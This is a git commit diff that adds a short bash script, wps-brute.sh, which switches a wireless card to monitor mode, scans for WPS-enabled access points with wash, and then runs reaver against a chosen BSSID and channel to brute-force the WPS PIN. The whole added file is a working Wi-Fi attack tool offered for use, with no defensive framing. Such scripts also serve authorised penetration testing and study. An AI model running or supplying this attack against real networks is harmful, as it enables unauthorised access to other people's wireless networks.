87fbd76b365df9cdcdbe4c26c0a99cb363b4c71c
Krzysztof Kuczewski <k.kuczewski10@gmail.com>
2026-01-10 10:46:31 +0100

    Split the wps-attack file into two scripts

---
+++ wifi/wps-brute.sh
@@ -0,0 +1,26 @@
+#!/bin/bash
+
+mode=$(iwconfig "${INTERFACE}" | grep -o "Mode:Managed")
+if [ "${mode}" = "Mode:Managed" ]; then
+		sudo ifconfig ${INTERFACE} down
+		sudo iwconfig ${INTERFACE} mode monitor
+		sudo ifconfig ${INTERFACE} up
+fi
+
+read -p "use 5ghz? (y/n): " ghz
+echo -e "Press ctrl+c to stop the scan\n"
+
+if [ "$ghz" = "n" ]; then
+		sudo wash -i "$INTERFACE" -2
+else
+		sudo wash -i "$INTERFACE" -5
+fi
+
+read -p "bssid?: " bssid
+read -p "channel?: " channel
+
+if [ "$ghz" = "n" ]; then
+		sudo reaver -i "$INTERFACE" -b "$bssid" -c "$channel" -vv
+elif [ "$ghz" = "y" ]; then
+		sudo reaver -i "$INTERFACE" -b "$bssid" -c "$channel" -5 -vv
+fi
